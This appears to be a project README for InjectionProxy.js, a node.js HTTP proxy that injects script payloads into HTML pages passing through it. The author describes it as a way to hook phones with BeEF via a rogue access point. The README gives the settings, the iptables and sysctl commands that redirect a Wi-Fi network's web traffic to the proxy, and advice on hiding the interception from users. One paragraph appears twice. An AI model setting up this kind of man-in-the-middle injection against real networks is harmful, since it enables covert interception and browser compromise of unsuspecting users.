# InjectionProxy.js
A simple node.js proxy capable of injecting code into html transmissions

## Installation
To install the required modules run the following command:

```
npm install colors dateformat iconv mootools 
```

## What it does
__injectionproxy.js__ is a simple multithreaded HTTP proxy. It will automatically decode all server replies with content-type html/text and status code 200. If it finds a configurable patteern it will inject a payload either before or after the pattern. It can handle gzip and inflate/deflate compressed content.

I did this quick hack to demonstrate how easy control over a mobile phone can be gained by injecting the [beef](http://beefproject.com/) hook.js into the html the phone is downloading through a rogue access point running this proxy.


## Configuring the proxy
By default the proxy will look for a file called settings.js. You can have multiple settings files. To run the proxy with a different settings file append the name of it to the commandline:
```
node injectionproxy.js mysettings.js
```

This is a very basic settings example:
```
module.exports = {
    "timeFormat"        : "HH:MM:ss",
    "preventCaching"    : true,
    "injectionLocation"	: "</body>",
    "injectBefore"	    : true,
    "payload"		    : "<script>alert('Hello!');</script>\n",
    "port"		        : 3128,
    "debug"		        : true
}
```
- Timeformat: obviously the format string for the log
- preventCaching: This will strip all caching related headers to avoid the server from sending us a 304 (Content not modified) reply
- injectionLocation: This is the place where the payload will be injected
- injectBefore: If set to true, the payload will be before the injectionLocation pattern. Otherwise it will be after the pattern
- payload: The payload which will be injected
- port: Listener Port of the proxy server
- debug: if true, then every single request will yield additional console log lines for incoming and outgoing traffic

### Setting up an HTTP Proxy with iptables and injectionproxy.js

Assuming you are setting up a router with iptables, eth0 is your uplink device and wlan0 the device users connect to then the following commands will be sufficient to set up a simple proxy where all traffic to any site on port 80 will be redirected to the proxy listener. The proxy will then figure out the target host from the HTTP request header and send the reply to the client:

```
 iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
 iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 127.0.0.1:3128
```

If you want to fly under the radar you may also want to pass thru all other traffic so the user doesn't realize his requests are being filtered:

```
iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
```

If you want to fly under the radar you may also want to pass thru all other traffic so the user doesn't realize his requests are being filtered:

```
iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
```

You will very likely have to enable routing from to the loopback device in the kernel. To do this issue this command:
 
```
sysctl -w net.ipv4.conf.wlan0.route_localnet=1
```